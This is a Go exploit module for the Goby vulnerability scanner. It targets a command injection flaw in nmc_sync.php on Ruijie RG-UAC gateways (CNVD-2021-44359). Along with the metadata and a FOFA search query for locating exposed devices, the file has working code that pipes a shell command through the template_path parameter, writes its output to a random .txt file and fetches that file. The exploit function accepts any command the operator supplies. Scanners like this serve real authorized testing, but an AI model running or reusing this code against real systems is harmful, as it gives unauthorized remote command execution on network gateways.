package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Ruijie nmc_sync.php file RCE Vulnerability",
    "Description": "<p>Ruijie RG-UAC series application management gateways are application management products independently developed by Ruijie.</p><p>There is a command execution vulnerability in the nmc_sync.php file of Ruijie RG-UAC application management gateway. An attacker can execute arbitrary commands to control server permissions.</p>",
    "Impact": "<p>Ruijie RG-UAC application management gateway nmc_ The sync.php file has a command execution vulnerability, which allows an attacker to execute arbitrary commands to control server privileges.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.ruijie.com.cn\">https://www.ruijie.com.cn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Ruijie RG-UAC",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "锐捷 RG-UAC 应用网关 nmc_sync.php 文件命令执行漏洞",
            "Product": "锐捷 RG-UAC",
            "Description": "<p>锐捷RG-UAC系列应用管理网关是锐捷自主研发的应用管理产品。</p><p>锐捷RG-UAC应用管理网关 nmc_sync.php 文件存在命令执行漏洞，攻击者可执行任意命令控制服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.ruijie.com.cn\">https://www.ruijie.com.cn</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>锐捷RG-UAC应用管理网关 nmc_sync.php 文件存在命令执行漏洞，攻击者可执行任意命令控制服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ruijie nmc_sync.php file RCE Vulnerability",
            "Product": "Ruijie RG-UAC",
            "Description": "<p>Ruijie RG-UAC series application management gateways are application management products independently developed by Ruijie.</p><p>There is a command execution vulnerability in the nmc_sync.php file of Ruijie RG-UAC application management gateway. An attacker can execute arbitrary commands to control server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.ruijie.com.cn\">https://www.ruijie.com.cn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Ruijie RG-UAC application management gateway nmc_ The sync.php file has a command execution vulnerability, which allows an attacker to execute arbitrary commands to control server privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"RG-UAC登录页面\"",
    "GobyQuery": "body=\"RG-UAC登录页面\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.ruijie.com.cn/",
    "DisclosureDate": "2022-02-04",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-44359"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10257"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			RandNmae := goutils.RandomHexString(4)
			uri1 := fmt.Sprintf("/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|ls%%20>%s.txt|cat", RandNmae)
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200 {
				uri2 := "/view/systemConfig/management/" + RandNmae + ".txt"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "nmc_sync.php")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			RandNmae := goutils.RandomHexString(4)
			uri1 := fmt.Sprintf("/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|%s%%20>%s.txt|cat", cmd, RandNmae)
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 {
				uri2 := "/view/systemConfig/management/" + RandNmae + ".txt"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
